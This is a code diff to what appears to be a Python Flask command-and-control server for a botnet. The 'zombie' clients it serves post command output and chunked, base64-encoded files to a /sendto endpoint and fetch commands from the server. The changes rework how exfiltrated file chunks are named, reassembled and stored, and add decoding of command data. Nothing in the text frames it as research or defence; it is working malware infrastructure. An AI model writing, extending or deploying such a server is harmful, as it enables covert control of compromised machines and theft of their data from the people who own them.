@@ -248,6 +248,9 @@ class Server:
                             #output = "LINK_TO_FILE"
                             return render_template('zombieData.html',c=cmd,token=token,z=zombieID)
                         else:
+                            logger.debug(f"found command, attempting to b64decode: {data}")
+                            data = data.split(":",1)[1]
+                            logger.debug(f"data is now: {data}")
                             data = base64.b64decode(data.encode('utf-8')).decode('utf-8')
                             cmd = data.split("CMD:")[1]
                             cmd = cmd.split(":OUTPUT:")[0].strip()
@@ -381,47 +384,32 @@ class Server:
         """
         @self.app.route("/sendto", methods=['POST'])
         def sendto():
-            logger.info(f"Recieved {request.method} request to /sendto from {request.remote_addr}")
             content = request.get_json()
-            logger.debug(f"found content: X-Client-ID={content['X-Client-ID']}, Chunk: {content['data'][0:10]}")
-            data = content['data']
             zombieID = content['X-Client-ID']
-            try:
-                pageID = content['page']
-            except:
-                pageID = None
-            #print(f"SENDTO => pageID: {pageID}")
-            if pageID is not None:
-                # handle files sent to server
-                logger.debug(f"pageID:{pageID}")
-                if pageID == 'END':
-                    ioFile = ioFiles.ioFiles(zombieID,self.base_path)
-                    if(ioFile.write_chunk(data)):
-                        logger.debug("Last data has been written")
-                    else:
-                        logger.debug("ERROR WRITTING DATA")
-                    body = {"X-Server-Version":"3"}
-                    #add worker logic here
-                    token = ioFile.process_file(zombieID)
-                    logger.debug("Data Files have been processed")
-                    #add database entry with zombieID and 'FILE' for blob
-                    self.db.add_file(zombieID,token=token)
-                    body = {"X-Server-Version":"3"}
-                    return jsonify(body) 
-                else:
-                    logger.debug("SAVING CHUNK TO FILE")
-                    ioFile = ioFiles.ioFiles(zombieID,self.base_path)
-                    ioFile.write_chunk(data)
-                    logger.debug("CHUNK SAVED")
-                    body = {"X-Server-Version":"3"}
-                    return jsonify(body)
-            else:
-                #no pages, just response data
-                self.db.add_data(data,zombieID)
-                body = {"X-Server-Version":"3"}
-                return jsonify(body)
+            data = content['data'] # This is "CHUNK_0:base64blob"
+            dataType = content['type']
+            pageID = content.get('page')
 
-            #return render_template("sendto.html",d=data,z=zombieID)
+            if dataType.upper() == "CMD":
+                self.db.add_data(data, zombieID)
+                return jsonify({"X-Server-Version": "3"})
+            else:
+                # Extract the index from the data string (e.g., "CHUNK_0")
+                # This ensures we know exactly which piece this is, regardless of arrival order
+                chunk_name = data.split(":")[0]
+
+                ioFile = ioFiles.ioFiles(zombieID, self.base_path)
+
+                if pageID == 'END':
+                    ioFile.write_chunk(chunk_name, data) # Pass the specific chunk name
+                    token = ioFile.process_file(zombieID)
+                    self.db.add_file(zombieID, token=token)
+                    return jsonify({"X-Server-Version": "3"})
+                else:
+                    ioFile.write_chunk(chunk_name, data)
+                    return jsonify({"X-Server-Version": "3"})
+            
+
 
         """
          - Zombies come here to recieve commands
